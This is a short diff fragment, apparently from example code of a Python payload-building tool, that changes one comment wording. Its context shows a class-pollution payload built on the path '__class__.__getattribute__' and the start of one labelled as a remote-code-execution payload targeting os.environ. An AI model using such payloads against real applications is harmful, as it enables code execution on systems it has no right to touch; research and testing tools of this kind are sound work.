@@ -17,7 +17,7 @@ payload = Payload.build(
     path="__class__.__getattribute__",
     value="1337"
 )
-# → {"__class__": {"__getattribute__": "1337"}}
+# produces {"__class__": {"__getattribute__": "1337"}}
 
 # Build an RCE payload targeting os.environ
 payload = Payload.build(
